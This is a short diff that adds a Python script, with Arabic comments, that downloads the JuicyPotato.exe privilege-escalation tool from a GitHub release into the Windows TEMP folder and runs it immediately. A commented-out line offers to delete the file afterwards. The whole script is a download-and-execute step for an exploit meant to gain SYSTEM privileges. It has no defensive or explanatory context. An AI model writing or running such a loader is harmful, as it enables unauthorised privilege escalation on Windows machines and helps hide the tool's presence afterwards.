@@ -1,0 +1,19 @@
+import requests
+import subprocess
+import os
+
+# الرابط إلى الملف التنفيذي
+url = "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+# مسار حفظ الملف المؤقت
+temp_file = os.path.join(os.getenv("TEMP"), "JuicyPotato.exe")
+
+# تحميل الملف
+response = requests.get(url)
+with open(temp_file, 'wb') as f:
+    f.write(response.content)
+
+# تشغيل الملف
+subprocess.run([temp_file])
+
+# (اختياري) حذف الملف بعد التشغيل
+# os.remove(temp_file)
